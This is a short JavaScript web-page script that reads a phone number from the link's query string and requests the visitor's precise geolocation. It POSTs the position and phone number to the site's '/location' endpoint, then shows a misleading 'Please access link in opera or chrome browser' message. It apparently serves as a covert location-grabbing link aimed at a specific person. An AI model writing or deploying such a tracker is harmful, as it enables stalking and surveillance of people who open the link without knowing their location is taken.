var params = {};

if (location.search) {
    var parts = location.search.substring(1).split('&');

    for (var i = 0; i < parts.length; i++) {
        var nv = parts[i].split('=');
        if (!nv[0]) continue;
        params[nv[0]] = nv[1] || true;
    }
}
var phone = params.phone;

var options = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
};

function success(pos) {
    var postDATA = pos;
    postDATA.phone = phone || null;
    var urlEncodedData = JSON.stringify(postDATA);
    var XHR = new XMLHttpRequest();

    XHR.open('POST', '/location');

    // We add the required HTTP header to handle a form data POST request
    XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    XHR.setRequestHeader('Content-Length', urlEncodedData.length);

    XHR.send(urlEncodedData);
    document.write('<h1>Please access link in opera or chrome browser</h1> ');


};

function error(err) {
    console.warn('ERROR(' + err.code + '): ' + err.message);
};
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error, options);
} else {
    document.write('<h1>Please access link in opera or chrome browser</h1> ');
}
